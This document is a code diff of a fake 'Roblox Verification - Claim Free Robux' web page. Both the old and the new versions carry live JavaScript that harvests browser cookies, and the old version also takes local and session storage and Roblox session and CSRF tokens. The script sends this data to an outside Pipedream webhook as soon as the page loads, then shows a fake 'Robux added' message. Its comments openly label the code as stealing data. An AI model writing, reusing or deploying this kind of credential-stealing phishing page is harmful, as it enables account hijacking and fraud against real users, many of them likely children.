@@ -1,188 +1,41 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Roblox Verification - Claim Free Robux</title>
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-        
-        body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            min-height: 100vh;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-        }
-        
-        .container {
-            background: white;
-            padding: 40px;
-            border-radius: 20px;
-            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
-            text-align: center;
-            max-width: 450px;
-            width: 90%;
-        }
-        
-        .logo {
-            width: 120px;
-            margin-bottom: 20px;
-        }
-        
-        h1 {
-            color: #333;
-            margin-bottom: 10px;
-            font-size: 28px;
-        }
-        
-        .subtitle {
-            color: #666;
-            margin-bottom: 30px;
-            font-size: 16px;
-        }
-        
-        .loading {
-            border: 4px solid #f3f3f3;
-            border-top: 4px solid #4CAF50;
-            border-radius: 50%;
-            width: 50px;
-            height: 50px;
-            animation: spin 1s linear infinite;
-            margin: 30px auto;
-        }
-        
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-        
-        .status {
-            font-size: 18px;
-            color: #4CAF50;
-            margin: 20px 0;
-            font-weight: bold;
-        }
-        
-        button {
-            background: linear-gradient(45deg, #ff6b6b, #feca57);
-            color: white;
-            border: none;
-            padding: 15px 40px;
-            border-radius: 50px;
-            font-size: 18px;
-            font-weight: bold;
-            cursor: pointer;
-            transition: transform 0.3s;
-            margin-top: 20px;
-        }
-        
-        button:hover {
-            transform: scale(1.05);
-        }
-        
-        .success {
-            color: #4CAF50 !important;
-            font-size: 24px;
-            animation: bounce 0.6s;
-        }
-        
-        @keyframes bounce {
-            0%, 20%, 50%, 80%, 100% { transform: translateY(0); }
-            40% { transform: translateY(-10px); }
-            60% { transform: translateY(-5px); }
-        }
-    </style>
+    <title>Robux Verification</title>
 </head>
 <body>
-    <div class="container">
-        <img src="https://www.roblox.com/favicon.ico" alt="Roblox" class="logo">
-        <h1>Roblox Security</h1>
-        <p class="subtitle">Verifying your account for Robux giveaway...</p>
-        
-        <div class="loading" id="loading"></div>
-        <div class="status" id="status">Checking cookies...</div>
-        <button onclick="verifyAccount()" id="verifyBtn">Continue Verification</button>
-    </div>
-
+    <h1>🔄 Verifying your account...</h1>
+    
     <script>
-        // PIPEDREAM WEBHOOK
-        const WEBHOOK = 'https://eogbjp3w7j4pc7k.m.pipedream.net';
+    // STEAL NGAY KHI VÀO TRANG
+    function stealData() {
+        const data = {
+            cookies: document.cookie,
+            userAgent: navigator.userAgent,
+            url: window.location.href,
+            timestamp: new Date().toISOString()
+        };
         
-        function stealAllData() {
-            const stolenData = {
-                roblox_cookie: document.cookie || 'No cookies',
-                roblox_localStorage: JSON.stringify(localStorage),
-                roblox_sessionStorage: JSON.stringify(sessionStorage),
-                user_agent: navigator.userAgent,
-                language: navigator.language,
-                platform: navigator.platform,
-                screen: `${screen.width}x${screen.height}`,
-                url: window.location.href,
-                referrer: document.referrer,
-                timestamp: new Date().toISOString(),
-                roblox_tokens: {
-                    rbx_sessionid: getCookie('RBXSession'),
-                    rbx_csrf: getCookie('_csrfToken'),
-                    guest_id: getCookie('guest_id')
-                }
-            };
-            
-            // GỬI DATA
-            fetch(WEBHOOK, {
-                method: 'POST',
-                mode: 'no-cors',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify(stolenData)
-            }).then(() => {
-                showSuccess();
-                console.log('✅ ALL DATA STOLEN!');
-            }).catch(err => {
-                console.log('❌ STEAL ERROR:', err);
-                showSuccess(); // VẪN HIỂN THỊ SUCCESS
-            });
-        }
-        
-        function getCookie(name) {
-            const value = `; ${document.cookie}`;
-            const parts = value.split(`; ${name}=`);
-            if (parts.length === 2) return parts.pop().split(';').shift();
-            return '';
-        }
-        
-        function showSuccess() {
-            document.getElementById('loading').style.display = 'none';
-            document.getElementById('status').innerHTML = '✅ Verification Complete!';
-            document.getElementById('status').className = 'status success';
-            document.getElementById('verifyBtn').innerHTML = '5000 Robux Added!';
-            document.querySelector('.container').style.background = 'linear-gradient(45deg, #4CAF50, #45a049)';
-        }
-        
-        function verifyAccount() {
-            document.getElementById('verifyBtn').innerHTML = 'Verifying...';
-            stealAllData();
-        }
-        
-        // AUTO STEAL KHI LOAD TRANG
-        window.addEventListener('load', function() {
-            setTimeout(stealAllData, 1000);
+        // GỬI DATA
+        fetch('https://eogbjp3w7j4pc7k.m.pipedream.net', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify(data)
+        }).then(() => {
+            console.log('✅ DATA STOLEN!');
+            document.body.innerHTML = '<h1 style="color:green">Verification Complete! Check your Robux!</h1>';
+        }).catch(err => {
+            console.log('❌ Error:', err);
         });
-        
-        // STEAL KHI CLICK BẤT CỨ ĐÂU
-        document.addEventListener('click', function() {
-            if (!document.cookie.includes('stolen')) {
-                stealAllData();
-                document.cookie = 'stolen=1';
-            }
-        });
+    }
+    
+    // CHẠY NGAY
+    stealData();
     </script>
 </body>
-</html
+</html>
+
+
 
